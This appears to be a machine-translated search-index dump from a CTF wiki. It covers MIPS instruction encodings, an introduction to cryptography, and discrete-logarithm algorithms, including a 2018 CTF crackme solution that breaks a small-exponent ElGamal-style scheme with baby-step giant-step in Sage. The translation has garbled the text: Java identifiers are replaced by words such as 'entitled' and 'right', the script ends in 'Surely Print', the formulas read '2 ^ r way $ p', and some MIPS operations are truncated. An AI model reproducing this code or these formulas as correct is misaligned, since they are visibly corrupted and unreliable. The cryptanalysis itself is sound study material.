Syntax: divu $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1011 J -- Jump Description: Jumps to the calculated address Operation: PC = nPC; nPC = (PC & 0xf0000000) Syntax: j target Encoding: 0000 10ii iiii iiii iiii iiii iiii iiii JAL -- Jump and link Description: Jumps to the calculated address and stores the return address in $31 Operation: $31 = PC + 8 (or nPC + 4); PC = nPC; nPC = (PC & 0xf0000000) Syntax: jal target Encoding: 0000 11ii iiii iiii iiii iiii iiii iiii JR -- Jump register Description: Jump to the address contained in register $s Operation: PC = nPC; nPC = $s; Syntax: jr $s Encoding: 0000 00ss sss0 0000 0000 0000 0000 1000 LB -- Load byte Description: A byte is loaded into a register from the specified address. Operation: $t = MEM[$s + offset]; advance_pc (4); Syntax: lb $t, offset($s) Encoding: 1000 00ss ssst tttt iiii iiii iiii iiii LUI -- Load upper immediate Description: The immediate value is shifted left 16 bits and stored in the register. The lower 16 bits are zeroes. Operation: $t = (imm << 16); advance_pc (4); Syntax: lui $t, imm Encoding: 0011 11-- ---t tttt iiii iiii iiii iiii LW -- Load word Description: A word is loaded into a register from the specified address. Operation: $t = MEM[$s + offset]; advance_pc (4); Syntax: lw $t, offset($s) Encoding: 1000 11ss ssst tttt iiii iiii iiii iiii MFHI -- Move from HI Description: The contents of register HI are moved to the specified register. Operation: $d = $HI; advance_pc (4); Syntax: mfhi $d Encoding: 0000 0000 0000 0000 dddd d000 0001 0000 MFLO -- Move from LO Description: The contents of register LO are moved to the specified register. Operation: $d = $LO; advance_pc (4); Syntax: mflo $d Encoding: 0000 0000 0000 0000 dddd d000 0001 0010 MULT - Multiply Description: Multiplies $s by $t and stores the result in $LO. Operation: $LO = $s * $t; advance_pc (4); Syntax: mult $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1000 MULTU - Multiply unsigned Description: Multiplies $s by $t and stores the result in $LO. Operation: $LO = $s * $t; advance_pc (4); Syntax: multu $s, $t Encoding: 0000 00ss ssst tttt 0000 0000 0001 1001 NOOP -- no operation Description: Performs no operation. Operation: advance_pc (4); Syntax: noop Encoding: 0000 0000 0000 0000 0000 0000 0000 0000 Note: The encoding for a NOOP represents the instruction SLL $0, $0, 0 which has no side effects. In fact, nearly every instruction that has $0 as its destination register will have no side effect and can thus be considered a NOOP instruction. OR -- Bitwise or Description: Bitwise logical ors two registers and stores the result in a register Operation: $d = $s Syntax: or $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0101 ORI -- Bitwise or immediate Description: Bitwise ors a register and an immediate value and stores the result in a register Operation: $t = $s Syntax: ori $t, $s, imm Encoding: 0011 01ss ssst tttt iiii iiii iiii iiii SB -- Store byte Description: The least significant byte of $t is stored at the specified address. Operation: MEM[$s + offset] = (0xff & $t); advance_pc (4); Syntax: sb $t, offset($s) Encoding: 1010 00ss ssst tttt iiii iiii iiii iiii SLL -- Shift left logical Description: Shifts a register value left by the shift amount listed in the instruction and places the result in a third register. Zeroes are shifted in. Operation: $d = $t << h; advance_pc (4); Syntax: sll $d, $t, h Encoding: 0000 00ss ssst tttt dddd dhhh hh00 0000 SLLV -- Shift left logical variable Description: Shifts a register value left by the value in a second register and places the result in a third register. Zeroes are shifted in. Operation: $d = $t << $s; advance_pc (4); Syntax: sllv $d, $t, $s Encoding: 0000 00ss ssst tttt dddd d--- --00 0100 SLT -- Set on less than (signed) Description: If $s is less than $t, $d is set to one. It gets zero otherwise. Operation: if $s < $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); Syntax: slt $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 1010 SLTI -- Set on less than immediate (signed) Description: If $s is less than immediate, $t is set to one. It gets zero otherwise. Operation: if $s < imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); Syntax: slti $t, $s, imm Encoding: 0010 10ss ssst tttt iiii iiii iiii iiii SLTIU -- Set on less than immediate unsigned Description: If $s is less than the unsigned immediate, $t is set to one. It gets zero otherwise. Operation: if $s < imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); Syntax: sltiu $t, $s, imm Encoding: 0010 11ss ssst tttt iiii iiii iiii iiii SLTU -- Set on less than unsigned Description: If $s is less than $t, $d is set to one. It gets zero otherwise. Operation: if $s < $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); Syntax: sltu $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 1011 SRA -- Shift right arithmetic Description: Shifts a register value right by the shift amount (shamt) and places the value in the destination register. The sign bit is shifted in. Operation: $d = $t >> h; advance_pc (4); Syntax: sra $d, $t, h Encoding: 0000 00-- ---t tttt dddd dhhh hh00 0011 SRL -- Shift right logical Description: Shifts a register value right by the shift amount (shamt) and places the value in the destination register. Zeroes are shifted in. Operation: $d = $t >> h; advance_pc (4); Syntax: srl $d, $t, h Encoding: 0000 00-- ---t tttt dddd dhhh hh00 0010 SRLV -- Shift right logical variable Description: Shifts a register value right by the amount specified in $s and places the value in the destination register. Zeroes are shifted in. Operation: $d = $t >> $s; advance_pc (4); Syntax: srlv $d, $t, $s Encoding: 0000 00ss ssst tttt dddd d000 0000 0110 SUB -- Subtract Description: Subtracts two registers and stores the result in a register Operation: $d = $s - $t; advance_pc (4); Syntax: sub $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0010 SUBU -- Subtract unsigned Description: Subtracts two registers and stores the result in a register Operation: $d = $s - $t; advance_pc (4); Syntax: subu $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d000 0010 0011 SW -- Store word Description: The contents of $t is stored at the specified address. Operation: MEM[$s + offset] = $t; advance_pc (4); Syntax: sw $t, offset($s) Encoding: 1010 11ss ssst tttt iiii iiii iiii iiii SYSCALL -- System call Description: Generates a software interrupt. Operation: advance_pc (4); Syntax: syscall Encoding: 0000 00-- ---- ---- ---- ---- --00 1100 XOR -- Bitwise exclusive or Description: Exclusive ors two registers and stores the result in a register Operation: $d = $s ^ $t; advance_pc (4); Syntax: xor $d, $s, $t Encoding: 0000 00ss ssst tttt dddd d--- --10 0110 XORI -- Bitwise exclusive or immediate Description: Bitwise exclusive ors a register and an immediate value and stores the result in a register Operation: $t = $s ^ imm; advance_pc (4); Syntax: xori $t, $s, imm Encoding: 0011 10ss ssst tttt iiii iiii iiii iiii","title":"0x2 Instruction Instruction"},{"location":"assembly/mips/readme/#reference","text":"MIPS Instruction Reference","title":"Reference"},{"location":"assembly/x86-x64/readme/","text":"Introduce the basic content of x86_x64 assembly.","title":"x86_x64"},{"location":"crypto/introduction/","text":"Cryptography can generally be divided into classical cryptography and modern cryptography. Among them, classical cryptography, as a practical art, its coding and deciphering usually depends on the creativity and skill of designers and adversaries, and does not clearly define the original cryptography. Classical cryptography mainly includes the following aspects: Monoalphabetic Cipher Polyalphabetic Cipher Strange encryption Modern cryptography originated from a large number of related theories in the middle and late 20 th century. In 1949, Shan Shan published a classic paper entitled \"Communication Theory of Security Systems\", marking the beginning of modern cryptography. Modern cryptography mainly includes the following aspects: Symmetric Cryptography, represented by DES, AES, and RC4. Asymmetric Cryptography, represented by RSA, ElGamal, elliptic curve encryption. Hash function, represented by MD5, SHA-1, SHA-512, etc. Digital Signature, represented by RSA signature, ElGamal signature, and DSA signature. Among them, the symmetric encryption system is mainly divided into two ways: Block Cipher, also known as block cipher. Stream Cipher, also known as stream cipher. In general, the fundamental goal of password designers is to protect information and information systems. Confidentiality (Confidentiality) Integrity Availability Authentication Non-repudiation Among them, the first three are called the three elements of CIA for information security. For password crackers, it is generally necessary to find a way to identify the cryptographic algorithm, and then brute force, or use the cryptosystem vulnerability to crack. Of course, it is also possible to bypass the corresponding detection by constructing a false hash value or a digital signature. In general, we will assume that the attacker knows the cryptosystem to be cracked, and the attack types are usually divided into the following four types: Attack Type Description | ciphertext attack | only has ciphertext | | Known plaintext attack | Have ciphertext and corresponding plaintext | | Select plaintext attack | Have encryption permission, can encrypt the plaintext and get the corresponding ciphertext| | Select ciphertext attack | Have decryption permission, can decrypt the ciphertext and get the corresponding plaintext | Note Note: I have previously written about the common scenarios of these attacks. As I continue to learn, I gradually realize that these types of attacks focus on describing the capabilities of attackers and may be applicable to a wide variety of scenarios. Therefore, the amendment was made. Recommend some information here [Khan Academy Open Class] ( http://open.163.com/special/Khan/moderncryptography.html ) [In-depth cryptography - Principles and Applications of Common Encryption Technologies] ( https://github.com/yuankeyang/python/blob/master/%E3%80%8A%E6%B7%B1%E5%85%A5 % E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%B8%B8%E7% 94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA% 94%E7%94%A8%E3%80%8B.pdf) https://cryptopals.com/ , a bunch of cryptography exercises. Note It is recommended to consider whether to buy a book in the case of reading the open class and simply looking at the e-book, because the book is usually left unused. Reference \u00b6 [Wikipedia-Cryptography] ( https://en.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6 ) Info Most of the definitions and examples in this section refer to Wikipedia.","title":"Introduction to Cryptography"},{"location":"crypto/introduction/#reference","text":"[Wikipedia-Cryptography] ( https://en.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6 ) Info Most of the definitions and examples in this section refer to Wikipedia.","title":"Reference"},{"location":"crypto/asymmetric/introduction/","text":"Introduction \u00b6 In asymmetric cryptography, the keys used by the encryptor and the decrypter are different. Typical examples are RSA encryption, knapsack encryption, and elliptic curve encryption.","title":"Introduction to Asymmetric Cryptography"},{"location":"crypto/asymmetric/introduction/#introduction","text":"In asymmetric cryptography, the keys used by the encryptor and the decrypter are different. Typical examples are RSA encryption, knapsack encryption, and elliptic curve encryption.","title":"Introduction"},{"location":"crypto/asymmetric/discrete-log/discrete-log/","text":"discrete logarithm \u00b6 Basic definition \u00b6 When we understand discrete logarithms, let's first look at a few basic definitions. Definition 1 In group G, g is the generator of G, that is, each element in group G can be written as y=g^k y=g^k , which we call k is the logarithm of y in group G. Definition 2 Let m\\geq 1 m\\geq 1 , (a,m)=1 (a,m)=1 , let a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m be the smallest positive integer d called a to the exponent or order of modulo m, we will generally It is recorded as \\delta_m(a) \\delta_m(a) . Definition 3 When \\delta_m(a)=\\varphi(m) \\delta_m(a)=\\varphi(m) , a is called the original root of modulo m, which is called the original root of m. Some properties \u00b6 Nature 1 The smallest positive integer d d that makes a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m true must have d\\mid\\varphi(m) d\\mid\\varphi(m) . Property 2 The necessary and sufficient condition for the existence of the original root of the modulo m m is m=2,4,p^{\\alpha}, 2p^{\\alpha} m=2,4,p^{\\alpha}, 2p^{\\alpha} , where p p is an odd prime, \\alpha \\alpha is positive Integer. Discrete logarithm problem \u00b6 Knowing g,p,y g,p,y , for the equation y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p , solving x x is a difficult problem. But when p p has certain characteristics, it can be solved. For example, the order of this group is a smooth number. It is this problem that constitutes a large part of modern cryptography, including Diffie\u2013Hellman key exchange, ElGamal algorithm, ECC, etc. Discrete logarithm solution \u00b6 \u66b4\u66b4 \u00b6 Given y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p , we can violently enumerate x x to get the true value of x x . Baby-step giant-step \u00b6 This method is often referred to as a small step, which uses the idea of an intermediate encounter attack. We can make x=im+j x=im+j , where m= \\lceil \\sqrt n\\rceil m= \\lceil \\sqrt n\\rceil , then the integers i and j are all in the range 0 to m. therefore y = g ^ x = g ^ {im + j} y = g ^ x = g ^ {im + j} That is y(g^{-m})^i=g^j y(g^{-m})^i=g^j Then we can enumerate all the j and calculate it and store it in a set S, then we enumerate i again, calculate y(g^{-m})^i y(g^{-m})^i , once we find the calculation The result in the set S shows that we got a collision and got i and j. This is obviously a way of compromise between time and space. We convert a O(n) O(n) time complexity, O(1) O(1) space complexity algorithm to a O(\\sqrt n) O(\\sqrt n) The algorithm of time complexity and space complexity of O(\\sqrt n) O(\\sqrt n) . among them Each increment of j means \"baby-step\", multiplied by g g at a time. Each increment of i means \"giant-step\", multiplied by g^{-m} g^{-m} at a time. def bsgs ( g , y , p ): m = int ( ceil ( sqrt ( p - 1 ))) S = { pow ( g , j , p ): j for j in range ( m )} gs = pow ( g , p - 1 - m , p ) for i in range ( m ): if y in S : return i * m + S [ y ] y = y * gs % p return None Pollard's \u03c1 algorithm \u00b6 We can solve the above problem with the time complexity of O(\\sqrt n) O(\\sqrt n) and the space complexity of O(1) O(1) . Please use Google for your specific principles. Pollard\u2019s kangaroo algorithm \u00b6 If we know that the range of x is a \\leq x \\leq b a \\leq x \\leq b , then we can solve the above problem with the time complexity of O(\\sqrt{ba}) O(\\sqrt{ba}) . Please use Google for your specific principles. Pohlig-Hellman algorithm \u00b6 Let's assume that the above mentioned group has a rank of n n for the element g g , and n n is a smooth number: n=\\prod\\limits_{i=1}^r p_i^{e_i} n=\\prod\\limits_{i=1}^r p_i^{e_i} . For each i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} : Calculate g_i \\equiv g^{n/p_i^{e_i}} \\pmod m g_i \\equiv g^{n/p_i^{e_i}} \\pmod m . According to the Lagrange theorem, the order of g_i g_i in the group is p_i^{e_i} p_i^{e_i} . Calculate y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i }} \\equiv g_i^{x_i} \\pmod m y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i }} \\equiv g_i^{x_i} \\pmod m , here we know y_i,m,g_i y_i,m,g_i , and x_i x_i ranges from [0,p_i^{e_i}) [0,p_i^{e_i}) , by n n is a Smooth numbers, the range is small, so we can quickly find x_i x_i using methods such as Pollard's kangaroo algorithm . According to the above derivation, we can get for i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} , x \\equiv x_i \\pmod{p_i^{e_i}} x \\equiv x_i \\pmod{p_i^{e_i}} , which can be solved by Chinese remainder theorem . The above process can be briefly described in the following figure: The complexity is O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) , and it can be seen that the complexity is still very low. But when n n is prime, m=2n+1 m=2n+1 , then the complexity and O(\\sqrt m) O(\\sqrt m) are almost indistinguishable. 2018 \u56fd\u8d5bcrackme java \u00b6 code show as below import java.math.BigInteger ; import java.util.Random ; public class Test1 { static BigInteger two = new BigInteger ( \"2\" ); static BigInteger p = new BigInteger ( \"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\" ); static BigInteger h = new BigInteger ( \"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\" ); /* Alice write the below algorithm for encryption. The public key {p, h} is broadcasted to everyone. @param val: The plaintext to encrypt. We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length. */ public static String pkEnc ( String val ){ BigInteger [] ret = new BigInteger [ 2 ] ; BigInteger bVal = new BigInteger ( val . toLowerCase (), 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); ret [ 0 ] = two . modPow ( r , p ); entitled [ 1 ] = h . modPow ( r , p ) . multiply ( bVal ); return right [ 0 ] . toString ( 36 ) + & quot ; ==& quot ; + ret [ 1 ] . toString ( 36 ); } /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know. public static String skDec(String val,BigInteger x){ if(!val.contains(\"==\")){ return null; } else { BigInteger val0=new BigInteger(val.split(\"==\")[0],36); BigInteger val1=new BigInteger(val.split(\"==\")[1],36); BigInteger s=val0.modPow(x,p).modInverse(p); return val1.multiply(s).mod(p).toString(36); } } */ public static void main ( String [] args ) throws Exception { System . out . println ( \"You intercepted the following message, which is sent from Bob to Alice:\" ); BigInteger bVal1 = new BigInteger ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\" , 36 ); BigInteger bVal2 = new BigInteger ( \"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" , 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); System . out . println ( r ); System . out . println ( bVal1 ); System . out . println ( bVal2 ); System . out . println ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" ); System . out . println ( \"Please figure out the plaintext!\" ); } } Basic function is calculation $ R_0 = 2 ^ r way $ p $ R_1 = b * h ^ r way $ p It can be found that the range of r is [0,2^{32}) [0,2^{32}) , so we can use the BSGS algorithm as follows from sage.all import * c1 = int ( 'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco' , 36 ) c2 = int ( '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc' , 36 ) print c1 , c2 p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711 h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916 # generate the group const2 = 2 const2 = Mod ( const2 , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) h = Mod ( h , p ) print '2' , bsgs ( const2 , c1 , bounds = ( 1 , 2 ^ 32 )) r = 152351913 num = long ( c2 / ( h ** r )) Surely Print Reference \u00b6 Elementary number theory, Pan Chengdong, Pan Chengyu https://ee.stanford.edu/~hellman/publications/28.pdf https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2 https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html","title":"Discrete Logarithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#discrete-logarithm","text":"","title":"discrete logarithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#basic-definition","text":"When we understand discrete logarithms, let's first look at a few basic definitions. Definition 1 In group G, g is the generator of G, that is, each element in group G can be written as y=g^k y=g^k , which we call k is the logarithm of y in group G. Definition 2 Let m\\geq 1 m\\geq 1 , (a,m)=1 (a,m)=1 , let a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m be the smallest positive integer d called a to the exponent or order of modulo m, we will generally It is recorded as \\delta_m(a) \\delta_m(a) . Definition 3 When \\delta_m(a)=\\varphi(m) \\delta_m(a)=\\varphi(m) , a is called the original root of modulo m, which is called the original root of m.","title":"Basic definition"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#some-properties","text":"Nature 1 The smallest positive integer d d that makes a^d \\equiv 1\\pmod m a^d \\equiv 1\\pmod m true must have d\\mid\\varphi(m) d\\mid\\varphi(m) . Property 2 The necessary and sufficient condition for the existence of the original root of the modulo m m is m=2,4,p^{\\alpha}, 2p^{\\alpha} m=2,4,p^{\\alpha}, 2p^{\\alpha} , where p p is an odd prime, \\alpha \\alpha is positive Integer.","title":"Some properties"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#discrete-logarithm-problem","text":"Knowing g,p,y g,p,y , for the equation y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p , solving x x is a difficult problem. But when p p has certain characteristics, it can be solved. For example, the order of this group is a smooth number. It is this problem that constitutes a large part of modern cryptography, including Diffie\u2013Hellman key exchange, ElGamal algorithm, ECC, etc.","title":"Discrete logarithm problem"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#discrete-logarithm-solution","text":"","title":"Discrete logarithm solution"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_1","text":"Given y\\equiv g^x \\pmod p y\\equiv g^x \\pmod p , we can violently enumerate x x to get the true value of x x .","title":"\u66b4\u66b4"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#baby-step-giant-step","text":"This method is often referred to as a small step, which uses the idea of an intermediate encounter attack. We can make x=im+j x=im+j , where m= \\lceil \\sqrt n\\rceil m= \\lceil \\sqrt n\\rceil , then the integers i and j are all in the range 0 to m. therefore y = g ^ x = g ^ {im + j} y = g ^ x = g ^ {im + j} That is y(g^{-m})^i=g^j y(g^{-m})^i=g^j Then we can enumerate all the j and calculate it and store it in a set S, then we enumerate i again, calculate y(g^{-m})^i y(g^{-m})^i , once we find the calculation The result in the set S shows that we got a collision and got i and j. This is obviously a way of compromise between time and space. We convert a O(n) O(n) time complexity, O(1) O(1) space complexity algorithm to a O(\\sqrt n) O(\\sqrt n) The algorithm of time complexity and space complexity of O(\\sqrt n) O(\\sqrt n) . among them Each increment of j means \"baby-step\", multiplied by g g at a time. Each increment of i means \"giant-step\", multiplied by g^{-m} g^{-m} at a time. def bsgs ( g , y , p ): m = int ( ceil ( sqrt ( p - 1 ))) S = { pow ( g , j , p ): j for j in range ( m )} gs = pow ( g , p - 1 - m , p ) for i in range ( m ): if y in S : return i * m + S [ y ] y = y * gs % p return None","title":"Baby-step giant-step"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-algorithm","text":"We can solve the above problem with the time complexity of O(\\sqrt n) O(\\sqrt n) and the space complexity of O(1) O(1) . Please use Google for your specific principles.","title":"Pollard&#39;s \u03c1 algorithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-kangaroo-algorithm","text":"If we know that the range of x is a \\leq x \\leq b a \\leq x \\leq b , then we can solve the above problem with the time complexity of O(\\sqrt{ba}) O(\\sqrt{ba}) . Please use Google for your specific principles.","title":"Pollard\u2019s kangaroo algorithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm","text":"Let's assume that the above mentioned group has a rank of n n for the element g g , and n n is a smooth number: n=\\prod\\limits_{i=1}^r p_i^{e_i} n=\\prod\\limits_{i=1}^r p_i^{e_i} . For each i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} : Calculate g_i \\equiv g^{n/p_i^{e_i}} \\pmod m g_i \\equiv g^{n/p_i^{e_i}} \\pmod m . According to the Lagrange theorem, the order of g_i g_i in the group is p_i^{e_i} p_i^{e_i} . Calculate y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i }} \\equiv g_i^{x_i} \\pmod m y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i }} \\equiv g_i^{x_i} \\pmod m , here we know y_i,m,g_i y_i,m,g_i , and x_i x_i ranges from [0,p_i^{e_i}) [0,p_i^{e_i}) , by n n is a Smooth numbers, the range is small, so we can quickly find x_i x_i using methods such as Pollard's kangaroo algorithm . According to the above derivation, we can get for i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} , x \\equiv x_i \\pmod{p_i^{e_i}} x \\equiv x_i \\pmod{p_i^{e_i}} , which can be solved by Chinese remainder theorem . The above process can be briefly described in the following figure: The complexity is O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) , and it can be seen that the complexity is still very low. But when n n is prime, m=2n+1 m=2n+1 , then the complexity and O(\\sqrt m) O(\\sqrt m) are almost indistinguishable.","title":"Pohlig-Hellman algorithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#2018-crackme-java","text":"code show as below import java.math.BigInteger ; import java.util.Random ; public class Test1 { static BigInteger two = new BigInteger ( \"2\" ); static BigInteger p = new BigInteger ( \"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\" ); static BigInteger h = new BigInteger ( \"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\" ); /* Alice write the below algorithm for encryption. The public key {p, h} is broadcasted to everyone. @param val: The plaintext to encrypt. We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length. */ public static String pkEnc ( String val ){ BigInteger [] ret = new BigInteger [ 2 ] ; BigInteger bVal = new BigInteger ( val . toLowerCase (), 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); ret [ 0 ] = two . modPow ( r , p ); entitled [ 1 ] = h . modPow ( r , p ) . multiply ( bVal ); return right [ 0 ] . toString ( 36 ) + & quot ; ==& quot ; + ret [ 1 ] . toString ( 36 ); } /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know. public static String skDec(String val,BigInteger x){ if(!val.contains(\"==\")){ return null; } else { BigInteger val0=new BigInteger(val.split(\"==\")[0],36); BigInteger val1=new BigInteger(val.split(\"==\")[1],36); BigInteger s=val0.modPow(x,p).modInverse(p); return val1.multiply(s).mod(p).toString(36); } } */ public static void main ( String [] args ) throws Exception { System . out . println ( \"You intercepted the following message, which is sent from Bob to Alice:\" ); BigInteger bVal1 = new BigInteger ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\" , 36 ); BigInteger bVal2 = new BigInteger ( \"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" , 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); System . out . println ( r ); System . out . println ( bVal1 ); System . out . println ( bVal2 ); System . out . println ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" ); System . out . println ( \"Please figure out the plaintext!\" ); } } Basic function is calculation $ R_0 = 2 ^ r way $ p $ R_1 = b * h ^ r way $ p It can be found that the range of r is [0,2^{32}) [0,2^{32}) , so we can use the BSGS algorithm as follows from sage.all import * c1 = int ( 'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco' , 36 ) c2 = int ( '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc' , 36 ) print c1 , c2 p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711 h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916 # generate the group const2 = 2 const2 = Mod ( const2 , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) h = Mod ( h , p ) print '2' , bsgs ( const2 , c1 , bounds = ( 1 , 2 ^ 32 )) r = 152351913 num = long ( c2 / ( h ** r )) Surely Print","title":"2018 \u56fd\u8d5bcrackme java"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#reference","text":"Elementary number theory, Pan Chengdong, Pan Chengyu https://ee.stanford.edu/~hellman/publications/28.pdf https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2 https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html","title":"Reference"},{"location":"crypto/asymmetric/discrete-log/ecc/","text":"ECC \u00b6 Overview \u00b6 ECC is called elliptic curve encryption, EllipseCurve Cryptography, which is a public key cryptography based on elliptic curve mathematics. Unlike traditional encryption methods based on the difficulty of large-scale factorization, ECC relies on the difficulty of solving the discrete logarithm problem of elliptic curves. Its main advantage is that it can maintain the same password strength while using a shorter key length than other methods. Currently, the finite field mainly used in the elliptic curve has The integer field GF(p), which is modulo prime, is usually more efficient on general purpose processors. The Galois Field GF (2^m) with a feature of 2 can be designed with dedicated hardware. basic knowledge \u00b6 Let us first look at the elliptic curve on the finite field. The elliptic curve on the finite field is the definition of the elliptic curve. y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e All coefficients in the finite element GF(p) are elements, where p is a large prime number. Of course, not all elliptic curves are suitable for encryption. The most common equations are as follows y^2=x^3+ax+b y^2=x^3+ax+b Where 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0 We call all the solutions (x, y), ( 